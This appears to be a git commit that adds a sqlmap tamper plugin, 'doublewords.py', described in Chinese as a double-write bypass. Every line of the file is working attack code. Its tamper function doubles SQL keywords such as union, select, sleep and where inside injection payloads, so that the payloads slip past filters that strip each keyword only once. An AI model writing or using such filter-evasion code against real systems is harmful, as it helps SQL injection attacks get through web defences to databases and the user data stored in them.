5f459377c3d9e715b9b31dbde59769aa68c7af12
interstin <484048373@qq.com>
2024-03-29 17:00:58 +0800

    双写绕过

---
+++ doublewords.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+'''
+sqlmap 双写绕过
+by:shadowwolf
+'''
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+import re
+ 
+__priority__ = PRIORITY.LOW
+ 
+def dependencies():
+    pass
+ 
+def tamper(payload, **kwargs):
+    payload= re.sub('or' , 'oorr',payload,flags=re.IGNORECASE)
+    payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
+    payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
+    payload= re.sub('and' , 'anandd',payload,flags=re.IGNORECASE)
+    payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
+    payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
+    payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
+    payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
+    retVal=payload
+    return retVal
+ 
